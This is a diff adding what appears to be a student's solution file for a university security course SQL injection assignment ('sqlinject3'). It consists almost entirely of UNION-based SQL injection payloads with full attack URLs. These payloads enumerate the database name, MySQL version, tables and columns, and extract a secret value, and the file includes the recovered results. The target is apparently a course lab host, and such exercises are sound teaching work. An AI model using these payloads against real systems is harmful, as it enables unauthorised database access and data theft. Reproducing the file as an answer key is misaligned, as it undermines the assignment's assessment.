@@ -1,0 +1,27 @@
+proj2_inject3
+8.0.36-0ubuntu0.20.04.1
+HINT,SECRET,foo,inject3_users
+thkqlkkjsb
+
+# 69' UNION SELECT 'id', 'Database Name', 'password', DATABASE() -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%27Database+Name%27%2C+%27password%27%2C+DATABASE%28%29+--+
+
+# 69' UNION SELECT 'id', "SQL Version", 'password', VERSION() -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%22SQL+Version%22%2C+%27password%27%2C+VERSION%28%29+--+
+
+
+# 69' UNION SELECT 'id', 'proj2_inject3 tables', 'password', GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'proj2_inject3' -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%27proj2_inject3+tables%27%2C+%27password%27%2C+GROUP_CONCAT%28table_name%29+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+--+
+
+# 69' UNION SELECT 'id', 'secret table columns', 'password',  GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'HINT' -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%27secret+table+columns%27%2C+%27password%27%2C++GROUP_CONCAT%28column_name%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3D+%27HINT%27+--+
+
+# 69' UNION SELECT 'id', 'hint message', 'password',  GROUP_CONCAT(message) FROM proj2_inject3.HINT -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%27hint+message%27%2C+%27password%27%2C++GROUP_CONCAT%28message%29+FROM+proj2_inject3.HINT+--+
+
+# 69' UNION SELECT 'id', 'secret table columns', 'password',  GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'SECRET' -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+%27secret+table+columns%27%2C+%27password%27%2C++GROUP_CONCAT%28column_name%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3D+%27SECRET%27+--+
+
+
+# 69' UNION SELECT 'id', hash, 'password', secret FROM proj2_inject3.SECRET WHERE proj2_inject3.SECRET.hash = MD5('abadia2') -- 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=69%27+UNION+SELECT+%27id%27%2C+hash%2C+%27password%27%2C+secret+FROM+proj2_inject3.SECRET+WHERE+proj2_inject3.SECRET.hash+%3D+MD5%28%27abadia2%27%29+--+
